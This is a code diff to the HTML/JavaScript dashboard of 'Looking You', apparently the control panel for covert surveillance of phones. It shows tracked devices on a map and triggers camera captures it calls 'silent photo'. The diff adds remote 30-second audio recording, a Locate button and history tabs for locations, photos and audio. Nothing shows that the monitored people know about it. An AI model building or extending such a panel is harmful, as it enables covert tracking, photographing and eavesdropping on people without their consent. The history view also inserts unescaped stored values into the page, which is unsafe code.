@@ -5,90 +5,143 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Looking You | Admin Dashboard</title>
     <link rel="stylesheet" href="style.css">
+    <!-- Google Fonts: Outfit -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <!-- Leaflet Map CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 </head>
 <body>
-    <div class="dashboard">
-        <!-- Sidebar -->
-        <aside class="sidebar">
+    <!-- FontAwesome for Premium Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <div class="hud-container">
+        <!-- 1. The Full-Screen Map Base -->
+        <div id="map"></div>
+
+        <!-- 2. Top Bar (Live Focus) -->
+        <header class="hud-top-bar glass-panel" id="device-actions" style="display: none;">
+            <div class="active-status">
+                <div class="monitoring-status" id="tracking-status">
+                    <span class="status-dot active"></span>
+                    <span class="status-text">Active</span>
+                </div>
+                <h2 id="active-device-name">No device selected</h2>
+            </div>
+            
+            <div class="top-controls">
+                <button id="btn-stop-tracking" onclick="toggleTracking('stop')" class="btn-action danger"><i class="fa-solid fa-pause"></i> Pause Tracking</button>
+                <button id="btn-start-tracking" onclick="toggleTracking('start')" class="btn-action success" style="display: none;"><i class="fa-solid fa-play"></i> Resume</button>
+            </div>
+        </header>
+
+        <!-- 3. Left Panel (Device Manager) -->
+        <aside class="hud-left-panel glass-panel">
             <div class="logo">
                 <h1>Looking<span>You</span></h1>
-                <p>Security Command Center</p>
+                <p>Command Node</p>
             </div>
             
             <div class="status-summary">
                 <div class="stat-card">
-                    <span class="label">Total Devices</span>
+                    <span class="label">Total Nodes</span>
                     <span class="value" id="total-count">0</span>
                 </div>
                 <div class="stat-card">
-                    <span class="label">Online</span>
+                    <span class="label">Active</span>
                     <span class="value online" id="online-count">0</span>
                 </div>
             </div>
 
             <nav class="device-list">
-                <h3>Online Devices</h3>
+                <h3>Connected Devices</h3>
                 <ul id="devices-ul">
-                    <li class="empty-msg">Waiting for devices...</li>
+                    <li class="empty-msg">Waiting for signal...</li>
                 </ul>
             </nav>
+        </aside>
 
+        <!-- 4. Right Panel (Gallery & Settings) -->
+        <aside class="hud-right-panel glass-panel">
             <div class="photo-gallery">
-                <h3>Last Captured</h3>
+                <h3>Live Feed</h3>
                 <div id="latest-photo-container">
-                    <p class="empty-msg">No photos yet</p>
+                    <p class="empty-msg">No visual data</p>
                 </div>
+            </div>
+            <div class="hud-footer">
+                <button onclick="logout()" class="btn-logout"><i class="fa-solid fa-power-off"></i> Disconnect</button>
             </div>
         </aside>
 
-        <!-- Main Content -->
-        <main class="main-content">
-            <header class="top-bar">
-                <div class="current-focus">
-                    <h2>Live Tracking</h2>
-                    <p id="active-device-name">No device selected</p>
-                </div>
-                <div class="actions" id="device-actions" style="display: none;">
-                    <div class="monitoring-status" id="tracking-status">
-                        <span class="status-dot active"></span>
-                        <span class="status-text">Active</span>
-                    </div>
-                    <button id="btn-stop-tracking" onclick="toggleTracking('stop')" class="btn-action danger">⏹ Stop Monitoring</button>
-                    <button id="btn-start-tracking" onclick="toggleTracking('start')" class="btn-action success" style="display: none;">▶ Start Monitoring</button>
-                    <button onclick="fetchHistory()" class="btn-action secondary">📜 View History</button>
-                    <button onclick="triggerAction('take_photo', 'front')" class="btn-action">📸 Front Photo</button>
-                    <button onclick="triggerAction('take_photo', 'back')" class="btn-action">📷 Back Photo</button>
-                </div>
-            </header>
+        <!-- 5. Bottom Dock (Action Center) -->
+        <div class="hud-bottom-dock glass-panel">
+            <button onclick="triggerAction('request_location')" class="dock-btn" title="Request Location">
+                <i class="fa-solid fa-location-crosshairs"></i>
+                <span>Locate</span>
+            </button>
+            <button onclick="triggerAction('take_photo', 'front')" class="dock-btn" title="Front Photo">
+                <i class="fa-solid fa-camera-rotate"></i>
+                <span>Front Cam</span>
+            </button>
+            <button onclick="triggerAction('take_photo', 'back')" class="dock-btn" title="Back Photo">
+                <i class="fa-solid fa-camera"></i>
+                <span>Back Cam</span>
+            </button>
+            <button onclick="triggerAction('request_audio', 30)" class="dock-btn warning" title="Record Audio (30s)">
+                <i class="fa-solid fa-microphone"></i>
+                <span>Record</span>
+            </button>
+            <div class="dock-divider"></div>
+            <button onclick="fetchHistory()" class="dock-btn primary" title="View History">
+                <i class="fa-solid fa-server"></i>
+                <span>Data Logs</span>
+            </button>
+        </div>
 
-            <div id="map"></div>
-
-            <!-- History Panel Overlay -->
-            <div id="history-overlay" class="overlay" style="display: none;">
-                <div class="panel">
-                    <div class="panel-header">
-                        <h3 id="history-title">Device History</h3>
-                        <button onclick="closeHistory()" class="btn-close">&times;</button>
-                    </div>
-                    <div id="history-content" class="panel-body">
-                        <!-- History items will be loaded here -->
-                    </div>
+        <!-- 6. History Overlay Modal -->
+        <div id="history-overlay" class="overlay glass-overlay" style="display: none;">
+            <div class="panel glass-panel">
+                <div class="panel-header">
+                    <h3 id="history-title">Device History</h3>
+                    <button onclick="closeHistory()" class="btn-close"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+                <div class="history-tabs">
+                    <button class="tab-btn active" onclick="switchHistoryTab(event, 'location')">📍 Locations</button>
+                    <button class="tab-btn" onclick="switchHistoryTab(event, 'photo')">📸 Photos</button>
+                    <button class="tab-btn" onclick="switchHistoryTab(event, 'audio')">🎙️ Audio</button>
+                </div>
+                <div id="history-content" class="panel-body">
+                    <!-- History items will be loaded here -->
                 </div>
             </div>
-        </main>
+        </div>
     </div>
 
     <!-- Scripts -->
     <script src="/socket.io/socket.io.js"></script>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
+        // --- Security Check ---
+        const token = localStorage.getItem('adminToken');
+        if (!token) {
+            window.location.href = '/login';
+        }
+
         const socket = io();
-        let map = L.map('map', { maxZoom: 19 }).setView([31.5204, 74.3587], 13); // Default to Lahore
+        let map = L.map('map', { 
+            maxZoom: 19,
+            zoomControl: false // We will customize controls later if needed
+        }).setView([31.5204, 74.3587], 13); // Default to Lahore
+        
+        // Add zoom control to bottom right
+        L.control.zoom({ position: 'bottomright' }).addTo(map);
+
+        // Standard White Map Tile Layer (OpenStreetMap)
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             maxZoom: 19,
-            attribution: '© OpenStreetMap'
+            attribution: '&copy; OpenStreetMap contributors'
         }).addTo(map);
 
         let markers = {};
@@ -106,6 +159,14 @@
         socket.on('photo_uploaded', (data) => {
             console.log('📸 New photo arrived:', data);
             displayNewPhoto(data);
+        });
+
+        socket.on('audio_uploaded', (data) => {
+            console.log('🎙️ New audio recording arrived:', data);
+            alert(`🎙️ New audio recording received from ${data.deviceId}! Check history to listen.`);
+            if (document.getElementById('history-overlay').style.display === 'block') {
+                fetchHistory(); // Refresh history to show the player
+            }
         });
 
         socket.on('update_location', (data) => {
@@ -208,6 +269,11 @@
                 // Show a loading/waiting state
                 const container = document.getElementById('latest-photo-container');
                 container.innerHTML = `<div class="loading">Capturing silent photo...</div>`;
+            } else if (action === 'request_location') {
+                socket.emit('request_current_location', { deviceId: activeDeviceId });
+            } else if (action === 'request_audio') {
+                socket.emit('trigger_audio', { deviceId: activeDeviceId, duration: param || 30 });
+                alert(`🎙️ Requesting ${param || 30}s audio recording...`);
             }
         }
 
@@ -256,11 +322,19 @@
             if (!activeDeviceId) return;
             const container = document.getElementById('history-content');
             container.innerHTML = '<div class="loading">Fetching records...</div>';
-            document.getElementById('history-overlay').style.display = 'block';
+            document.getElementById('history-overlay').style.display = 'flex';
             document.getElementById('history-title').innerText = `History: ${activeDeviceId}`;
 
+            // Reset tabs to default (Location)
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelector('.tab-btn').classList.add('active'); // First button
+
             try {
-                const response = await fetch(`/api/history/${activeDeviceId}`);
+                const response = await fetch(`/api/history/${activeDeviceId}`, {
+                    headers: { 'Authorization': `Bearer ${localStorage.getItem('adminToken')}` }
+                });
+                
+                if (response.status === 401) return logout();
                 const data = await response.json();
                 
                 if (data.length === 0) {
@@ -271,22 +345,63 @@
                 // Visualize path on map
                 drawHistoryPath(data);
 
-                container.innerHTML = data.map(log => `
-                    <div class="history-item ${log.logType}">
-                        <div class="item-meta">
-                            <span class="type">${log.logType}</span>
+                // Group data by type
+                const locLogs = data.filter(l => l.logType === 'location');
+                const photoLogs = data.filter(l => l.logType === 'photo');
+                const audioLogs = data.filter(l => l.logType === 'audio');
+
+                container.innerHTML = `
+                    <div class="tab-pane active" id="pane-location">
+                        ${locLogs.length > 0 ? locLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No location records</p>'}
+                    </div>
+                    <div class="tab-pane" id="pane-photo">
+                        ${photoLogs.length > 0 ? photoLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No photos found</p>'}
+                    </div>
+                    <div class="tab-pane" id="pane-audio">
+                        ${audioLogs.length > 0 ? audioLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No audio recordings</p>'}
+                    </div>
+                `;
+            } catch (err) {
+                container.innerHTML = '<p class="error empty-msg">Failed to load history</p>';
+            }
+        }
+
+        function buildLogHtml(log) {
+            return `
+                <div class="history-item ${log.logType}">
+                    <div class="item-meta">
+                        <div>
+                            <span class="type-badge type-${log.logType}">${log.logType.toUpperCase()}</span>
                             <span class="time">${new Date(log.createdAt).toLocaleString()}</span>
                         </div>
-                        ${log.logType === 'photo' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
-                        <div class="item-details">
-                            ${log.logType === 'location' ? `📍 ${log.latitude}, ${log.longitude}` : ''}
-                            ${log.batteryLevel ? ` | 🔋 ${log.batteryLevel}%` : ''}
-                        </div>
-                        <button onclick="deleteLog(${log.id})" class="btn-delete">Delete</button>
+                        <button onclick="deleteLog(${log.id})" class="btn-delete"><i class="fa-solid fa-trash"></i></button>
                     </div>
-                `).join('');
-            } catch (err) {
-                container.innerHTML = '<p class="error">Failed to load history</p>';
+                    ${log.logType === 'photo' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
+                    ${log.logType === 'audio' ? `
+                        <div class="audio-player-box">
+                            <span>🎙️ Audio Recording</span>
+                            <audio controls>
+                                <source src="${log.url}" type="audio/mp4">
+                                <source src="${log.url}" type="audio/mpeg">
+                            </audio>
+                        </div>` : ''}
+                    <div class="item-details">
+                        ${log.logType === 'location' ? `<i class="fa-solid fa-location-dot"></i> ${log.latitude}, ${log.longitude}` : ''}
+                        ${log.batteryLevel ? ` &nbsp;|&nbsp; <i class="fa-solid fa-battery-half"></i> ${log.batteryLevel}%` : ''}
+                    </div>
+                </div>
+            `;
+        }
+
+        function switchHistoryTab(event, tabName) {
+            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            
+            const pane = document.getElementById(`pane-${tabName}`);
+            if (pane) pane.classList.add('active');
+            
+            if (event && event.currentTarget) {
+                event.currentTarget.classList.add('active');
             }
         }
 
@@ -316,13 +431,23 @@
         async function deleteLog(id) {
             if (!confirm('Are you sure you want to delete this record?')) return;
             try {
-                const response = await fetch(`/api/history/${id}`, { method: 'DELETE' });
+                const response = await fetch(`/api/history/${id}`, { 
+                    method: 'DELETE',
+                    headers: { 'Authorization': `Bearer ${localStorage.getItem('adminToken')}` }
+                });
+                if (response.status === 401) return logout();
                 if (response.ok) {
                     fetchHistory(); // Refresh
                 }
             } catch (err) {
                 alert('Failed to delete');
             }
+        }
+
+        function logout() {
+            localStorage.removeItem('adminToken');
+            localStorage.removeItem('adminInfo');
+            window.location.href = '/login';
         }
 
         function closeHistory() {
